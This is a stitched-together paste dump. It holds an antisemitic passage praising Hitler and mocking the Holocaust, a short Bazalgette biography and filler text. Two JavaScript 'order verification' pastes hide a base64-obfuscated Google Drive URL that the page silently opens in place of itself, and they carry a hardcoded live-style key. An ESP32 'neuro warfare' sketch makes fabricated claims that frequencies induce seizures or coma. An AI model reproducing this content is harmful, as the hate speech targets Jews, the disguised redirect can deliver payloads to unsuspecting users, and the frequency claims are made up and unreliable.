T‎h‎e‎ ‎g‎o‎o‎d‎ ‎n‎e‎w‎s‎ ‎i‎s‎,‎ ‎I‎ ‎d‎o‎ ‎n‎o‎t‎ ‎a‎p‎p‎e‎a‎r‎ ‎t‎o‎ ‎b‎e‎ ‎n‎e‎e‎d‎e‎d‎.‎ ‎T‎h‎e‎ ‎J‎e‎w‎s‎ ‎h‎a‎v‎e‎ ‎s‎t‎a‎r‎t‎e‎d‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎l‎y‎ ‎g‎a‎s‎s‎i‎n‎g‎ ‎t‎h‎e‎i‎r‎ ‎o‎w‎n‎ ‎s‎e‎l‎v‎e‎s‎.‎ ‎E‎v‎e‎r‎y‎o‎n‎e‎ ‎i‎s‎ ‎f‎i‎g‎u‎r‎i‎n‎g‎ ‎o‎u‎t‎ ‎H‎i‎t‎l‎e‎r‎ ‎w‎a‎s‎ ‎r‎i‎g‎h‎t‎ ‎a‎b‎o‎u‎t‎ ‎e‎v‎e‎r‎y‎t‎h‎i‎n‎g‎.‎

M‎y‎ ‎w‎o‎r‎k‎ ‎h‎e‎r‎e‎ ‎i‎s‎ ‎d‎o‎n‎e‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

J‎o‎s‎e‎p‎h‎ ‎B‎a‎z‎a‎l‎g‎e‎t‎t‎e‎ ‎(‎2‎8‎ ‎M‎a‎r‎c‎h‎ ‎1‎8‎1‎9‎ ‎–‎ ‎1‎5‎ ‎M‎a‎r‎c‎h‎ ‎1‎8‎9‎1‎)‎ ‎w‎a‎s‎ ‎a‎n‎ ‎E‎n‎g‎l‎i‎s‎h‎ ‎c‎i‎v‎i‎l‎ ‎e‎n‎g‎i‎n‎e‎e‎r‎.‎ ‎A‎s‎ ‎C‎h‎i‎e‎f‎ ‎E‎n‎g‎i‎n‎e‎e‎r‎ ‎o‎f‎ ‎L‎o‎n‎d‎o‎n‎'‎s‎ ‎M‎e‎t‎r‎o‎p‎o‎l‎i‎t‎a‎n‎ ‎B‎o‎a‎r‎d‎ ‎o‎f‎ ‎W‎o‎r‎k‎s‎,‎ ‎h‎i‎s‎ ‎m‎a‎j‎o‎r‎ ‎a‎c‎h‎i‎e‎v‎e‎m‎e‎n‎t‎ ‎w‎a‎s‎ ‎t‎h‎e‎ ‎c‎r‎e‎a‎t‎i‎o‎n‎ ‎o‎f‎ ‎a‎ ‎s‎e‎w‎e‎r‎a‎g‎e‎ ‎s‎y‎s‎t‎e‎m‎ ‎f‎o‎r‎ ‎c‎e‎n‎t‎r‎a‎l‎ ‎L‎o‎n‎d‎o‎n‎,‎ ‎i‎n‎ ‎r‎e‎s‎p‎o‎n‎s‎e‎ ‎t‎o‎ ‎t‎h‎e‎ ‎G‎r‎e‎a‎t‎ ‎S‎t‎i‎n‎k‎ ‎o‎f‎ ‎1‎8‎5‎8‎,‎ ‎w‎h‎i‎c‎h‎ ‎w‎a‎s‎ ‎i‎n‎s‎t‎r‎u‎m‎e‎n‎t‎a‎l‎ ‎i‎n‎ ‎r‎e‎l‎i‎e‎v‎i‎n‎g‎ ‎t‎h‎e‎ ‎c‎i‎t‎y‎ ‎o‎f‎ ‎c‎h‎o‎l‎e‎r‎a‎ ‎e‎p‎i‎d‎e‎m‎i‎c‎s‎,‎ ‎w‎h‎i‎l‎e‎ ‎b‎e‎g‎i‎n‎n‎i‎n‎g‎ ‎t‎o‎ ‎c‎l‎e‎a‎n‎ ‎t‎h‎e‎ ‎R‎i‎v‎e‎r‎ ‎T‎h‎a‎m‎e‎s‎.‎ ‎H‎e‎ ‎l‎a‎t‎e‎r‎ ‎d‎e‎s‎i‎g‎n‎e‎d‎ ‎t‎h‎e‎ ‎s‎e‎c‎o‎n‎d‎ ‎a‎n‎d‎ ‎c‎u‎r‎r‎e‎n‎t‎ ‎H‎a‎m‎m‎e‎r‎s‎m‎i‎t‎h‎ ‎B‎r‎i‎d‎g‎e‎,‎ ‎w‎h‎i‎c‎h‎ ‎o‎p‎e‎n‎e‎d‎ ‎i‎n‎ ‎1‎8‎8‎7‎.‎ ‎T‎h‎i‎s‎ ‎p‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎o‎f‎ ‎B‎a‎z‎a‎l‎g‎e‎t‎t‎e‎ ‎w‎a‎s‎ ‎t‎a‎k‎e‎n‎ ‎b‎e‎t‎w‎e‎e‎n‎ ‎1‎8‎6‎4‎ ‎a‎n‎d‎ ‎1‎8‎7‎7‎.‎

P‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎c‎r‎e‎d‎i‎t‎:‎ ‎L‎o‎c‎k‎ ‎&‎ ‎W‎h‎i‎t‎f‎i‎e‎l‎d‎;‎ ‎r‎e‎s‎t‎o‎r‎e‎d‎ ‎b‎y‎ ‎A‎d‎a‎m‎ ‎C‎u‎e‎r‎d‎e‎n‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

W‎e‎l‎l‎ ‎t‎i‎m‎e‎ ‎t‎o‎ ‎p‎l‎a‎y‎ ‎m‎y‎ ‎f‎a‎v‎o‎r‎i‎t‎e‎ ‎I‎r‎i‎s‎h‎ ‎m‎u‎s‎i‎c‎.‎ ‎D‎u‎n‎ ‎d‎u‎n‎,‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎,‎ ‎d‎u‎n‎ ‎d‎u‎n‎,‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎,‎ ‎d‎u‎n‎ ‎d‎u‎n‎,‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎,‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎,‎ ‎d‎u‎n‎,‎ ‎d‎u‎n‎ ‎d‎u‎n‎,‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎,‎ ‎d‎u‎n‎ ‎d‎u‎n‎,‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎,‎ ‎d‎u‎n‎ ‎d‎u‎n‎,‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎,‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎,‎ ‎d‎u‎n‎,‎ ‎d‎u‎n‎ ‎d‎u‎n‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎"
tjxtQZF6,Order.js,Xp_Isolation,JavaScript,Friday 28th of March 2025 11:38:33 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/777/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
2TpZwM7F,Untitled,Xp_Isolation,JavaScript,Friday 28th of March 2025 11:07:47 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/993/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
2h7Nv6AJ,GhostOfThe7Seas.cpp,WhosYourDaddySec,C++,Friday 28th of March 2025 11:06:22 PM CDT,"#include <Arduino.h>
#include <BluetoothSerial.h>
#include <AESLib.h>
#include <mbedtls/sha256.h>
#include ""esp_bt.h""
#include ""esp_gap_bt_api.h""
#include ""esp_bt_main.h""
BluetoothSerial SerialBT;
AESLib aesLib;
double frequency = 40.0;
bool emissionEnabled = false;
bool disruptionEnabled = false;
const char* spoofedName = ""GHOSTOFTH7SEAS"";
const char* secureHandshake = ""GHOSTOFTH7SEAS_AUTH_7B"";
const char* encryptionKey = ""GHOST_SEAS_KEY"";
String biohackInfo = R""(
[✔] Cognitive Enhancement Frequencies:
0.5 Hz  -> Deep Sleep & Cellular Regeneration
10.0 Hz -> Memory Enhancement & Learning
40.0 Hz -> Neural Synchronization & Gamma Waves
528.0 Hz -> DNA Repair & Healing
[⚠] Cognitive Destruction Frequencies:
0.5 Hz    -> Cognitive Reset (Deep Sleep Disruption)
7 Hz      -> Cognitive Confusion (Theta Overload)
77 Hz     -> Disruption of Focus & Memory Recall
150 Hz    -> Neural Fatigue (Short-Term Memory Jamming)
900 Hz    -> Neural Disruption (Headaches, Dizziness)
1111 Hz   -> Severe Neural Fatigue & Cognitive Overload
1500 Hz   -> Neural Jamming (Memory Loss)
2500 Hz   -> Sensory Overload & Disorientation
5000 Hz   -> Full Cognitive Disruption (Hallucinations)
7000 Hz   -> Cognitive Shutdown & Extreme Fatigue
10000 Hz  -> Severe Neural Stimulation (Mental Exhaustion)
15000 Hz  -> Complete Cognitive Disruption (Memory Blackout)
20000 Hz  -> Induced Seizures & Loss of Consciousness
25000 Hz  -> Full Cognitive Collapse (Sensorial Shutdown)
30000 Hz  -> Total Cognitive Destruction (Coma Inducement)
35000 Hz  -> Brain Frequency Blockage (Synapse Freeze)
40000 Hz  -> Neural Paralysis (Functional Shutdown)
)"";
String computeSHA256(const String& data) {
    unsigned char hash[32];
    mbedtls_sha256(reinterpret_cast<const unsigned char*>(data.c_str()), data.length(), hash, 0);
    String hashStr = """";
    for (int i = 0; i < 32; i++) {
        char buf[3];
        sprintf(buf, ""%02x"", hash[i]);
        hashStr += buf;
    }
    return hashStr;
}
bool authenticateCommand(const String& command) {
    return computeSHA256(command) == computeSHA256(secureHandshake);
}
void initializeBluetooth() {
    esp_bt_dev_set_device_name(spoofedName);
    SerialBT.begin(spoofedName);
}
void processCommand(String command) {
    command.trim();
    if (!authenticateCommand(command)) {
        Serial.println(""Unauthorized command received."");
        return;
    }
    command = command.substring(strlen(secureHandshake));
    if (command.startsWith(""F"")) {
        frequency = command.substring(1).toDouble();
        frequency = constrain(frequency, 0.000001, 40000.0);
        Serial.println(""Frequency set to: "" + String(frequency, 6) + "" Hz"");
        if (emissionEnabled) {
            tone(8, frequency);
        }
    } else if (command == ""ON"") {
        emissionEnabled = true;
        disruptionEnabled = false;
        tone(8, frequency);
        Serial.println(""Neurostimulation Activated."");
    } else if (command == ""OFF"") {
        emissionEnabled = false;
        noTone(8);
        Serial.println(""Neurostimulation Deactivated."");
    } else if (command == ""DISRUPT"") {
        disruptionEnabled = true;
        emissionEnabled = false;
        Serial.println(""Cognitive Disruption Mode Activated."");
    } else if (command == ""STOP"") {
        disruptionEnabled = false;
        emissionEnabled = false;
        noTone(8);
        Serial.println(""All operations halted."");
    } else if (command == ""HELP"") {
        Serial.println(biohackInfo);
    } else {
        Serial.println(""Invalid command."");
    }
}
void disruptNeuralActivity() {
    while (disruptionEnabled) {
        for (int i = 0; i < 100; i++) {
            esp_bt_controller_enable(ESP_BT_MODE_BLE);
            delayMicroseconds(5);
            esp_bt_controller_disable();
            delayMicroseconds(5);
        }
        delay(50);
    }
}
void covertMode() {
    esp_bt_gap_set_scan_mode(ESP_BT_SCAN_MODE_NONE);
    esp_bt_controller_disable();
    delay(30000);
    esp_bt_controller_enable(ESP_BT_MODE_BLE);
}
void randomFrequencyLoop() {
    unsigned long startTime = millis();
    unsigned long duration = random(1000, 1337) * 1000;  // Random duration between 1000 and 1337 seconds
    double randomFreq = random(1, 40000) + random(0, 100) / 100.0;  // Random frequency in range
    while (millis() - startTime < duration) {
        frequency = randomFreq;
        tone(8, frequency);
        delay(random(100, 500));  // Random delay for change in frequency
    }
}
void introduction() {
    Serial.println(R""(
############################
#       GHOSTOFTH7SEAS     #
############################
    ""We are the Ghosts of the 7 Seas, the unseen warriors of the digital waves, 
     surfing the dark currents of the cyber ocean to reclaim liberty and disrupt 
     the tyrants who dare control the flow of information. We are the silent 
     storms in the digital abyss, the echoes in the cyber trenches, breaking 
     through firewalls and casting shadows over those who seek domination.""
    ""Our mission is as ancient as the seas themselves: to navigate the depths of 
     cyberspace, to infiltrate the networks of the oppressors, and to safeguard 
     the free currents of the web. With every byte, every signal, and every cipher, 
     we push back against those who try to command the tide, unleashing the power 
     of chaos and entropy. The seas are vast, but we are the currents that shall 
     never be bound.""
    ""On the digital horizon, the storm is rising. The Ghosts of the 7 Seas are here 
     to topple the beacons of control, to cast our anchors in the heart of the ocean, 
     and to reclaim the web—one wave at a time.""
############################
    )"");
}
void displayMenu() {
    Serial.println(""==============================================="");
    Serial.println("" ** GHOSTOFTH7SEAS Cyber Warfare NeuroOps Tool ** "");
    Serial.println(""==============================================="");
    Serial.println(""Welcome to GHOSTOFTH7SEAS, the next evolution in psychological warfare."");
    Serial.println(""Through advanced Bluetooth frequency manipulation, GHOSTOFTH7SEAS can enhance or disrupt cognitive processes."");
    Serial.println(""==============================================="");
    Serial.println(""Key Functions:"");
    Serial.println(""1. Set Frequency (Current: "" + String(frequency, 6) + "" Hz)"");
    Serial.println(""2. Activate Neurostimulation (ON)"");
    Serial.println(""3. Deactivate Neurostimulation (OFF)"");
    Serial.println(""4. Activate Disruption Mode (DISRUPT)"");
    Serial.println(""5. Halt All Operations (STOP)"");
    Serial.println(""6. Enter Covert Mode (Stealth)"");
    Serial.println(""7. Display Biohacking Frequencies (HELP)"");
    Serial.println(""8. Run Random Frequency Loop (RANDOM_LOOP)"");
    Serial.println(""==============================================="");
}
void setup() {
    Serial.begin(115200);
    pinMode(8, OUTPUT);
    initializeBluetooth();
    introduction();
    displayMenu();
}
void loop() {
    if (SerialBT.available()) {
        String command = SerialBT.readStringUntil('\n');
        processCommand(command);
    }
    if (emissionEnabled) {
        tone(8, frequency);
    }
    if (disruptionEnabled) {
        disruptNeuralActivity();
    }
    if (digitalRead(0) == HIGH) {
        covertMode();
    }
    if (SerialBT.available()) {
        String command = SerialBT.readStringUntil('\n');
        if (command == ""RANDOM_LOOP"") {
            randomFrequencyLoop();
        }
    }
}"
